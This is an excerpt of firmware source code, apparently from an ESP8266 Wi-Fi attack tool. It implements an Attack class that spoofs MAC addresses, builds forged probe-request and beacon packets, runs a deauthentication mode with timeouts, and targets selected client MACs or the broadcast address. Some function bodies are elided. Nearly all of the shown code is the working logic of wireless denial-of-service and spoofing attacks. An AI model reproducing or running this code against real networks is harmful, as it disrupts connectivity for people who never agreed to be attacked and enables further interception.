...
void Attack::generate()
{
	...
	for ( int i = 0; i < macListLen; i++ ) {
		channels[i] = random ( 1, maxChannel );
	}
...
void Attack::buildProbe ( String _ssid, Mac _mac )
{
	...
	for ( int i = 0; i < sizeof ( probePacket ); i++ )
	{ packet[packetSize + i] = probePacket[i]; }
	
	packetSize += sizeof ( probePacket );
	
	for ( int i = 0; i < 6; i++ ) {
		packet[10 + i] = _mac._get ( i );
	}
	...
	for ( int i = 0; i < len; i++ ) {
		packet[packetSize + i] = _ssid[i];
	}
	
	packetSize += len;
	
	for ( int i = 0; i < sizeof ( probePacket_RateTag ); i++ )
	{ packet[packetSize + i] = probePacket_RateTag[i]; }
...
void Attack::run()
{
	...
	if ( isRunning[0] && currentMillis - prevTime[0] >= 1000 ) {
		if ( debug )
		{ Serial.print ( "running " + ( String ) attackNames[0] + " attack..." ); }
		...
		if ( settings.attackTimeout > 0 ) {
			...
			if ( attackTimeoutCounter[0] > settings.attackTimeout ) {
				stop ( 0 );
			}
		}
	}
	...
	if ( isRunning[1] && currentMillis - prevTime[1] >= 1000 / beaconsPerSecond ) {
		if ( debug )
		{ Serial.print ( "running " + ( String ) attackNames[1] + " attack..." ); }
		
		prevTime[1] = millis ();
		
		for ( int a = 0; a < ssidList.len; a++ ) {
			buildBeacon ( beaconAdrs._get ( a ), ssidList.get ( a ), channels[a],
				ssidList.isEncrypted ( a ) );
		...
		if ( settings.macInterval > 0 ) {
			if ( macListChangeCounter / beaconsPerSecond >= settings.macInterval )
			{ generate (); }
		}
		...
		if ( settings.attackTimeout > 0 ) {
			...
			if ( attackTimeoutCounter[1] / beaconsPerSecond > settings.attackTimeout )
			{ stop ( 1 ); }
		}
	}
	...
	if ( isRunning[2] && currentMillis - prevTime[2] >= 1000 ) {
		...
		if ( settings.attackTimeout > 0 ) {
			...
			if ( attackTimeoutCounter[2] > settings.attackTimeout ) {
				stop ( 2 );
			}
		}
	}
	...
	if ( ( isRunning[1] || isRunning[2] ) && randomMode &&
		currentMillis - randomTime >= 1000 ) {
		randomTime = millis ();
...
void Attack::start ( int num )
{
	...
	if ( !isRunning[num] ) {
		...
		if ( debug )
		{ Serial.println ( "starting " + ( String ) attackNames[num] + " attack..." ); }
		
		if ( num == 0 )
		{ attackMode_deauth = "STOP"; }
		
		else
			if ( num == 1 )
			{ attackMode_beacon = "STOP"; }
...
void Attack::stop ( int num )
{
	if ( isRunning[num] ) {
		if ( debug )
		{ Serial.println ( "stopping " + ( String ) attackNames[num] + " attack..." ); }
...
size_t Attack::getSize()
{
	...
	for ( int i = 0; i < clientScan.results; i++ ) {
		if ( clientScan.getClientSelected ( i ) ) {
			json += "\"" +
				clientScan.getClientMac ( i ).toString () +
				" " +
				clientScan.getClientVendor ( i ) +
				" - " +
				clientScan.getClientName ( i ) +
				"\",";
			_selected++;
		}
	}
	...
	if ( _selected == 0 )
	{ json += "\"FF:FF:FF:FF:FF:FF - BROADCAST\""; }
...
void Attack::sendResults()
{
	...
	if ( debug )
	{ Serial.print ( "getting attacks JSON (" + ( String ) _size + ")..." ); }
...
void Attack::refreshLed()
{
	...
	if ( numberRunning >= 1 && settings.useLed ) {
		...
		if ( numberRunning == 0 || !settings.useLed ) {
			if ( debug ) {
				Serial.println ( "Attack LED : OFF" );
			}
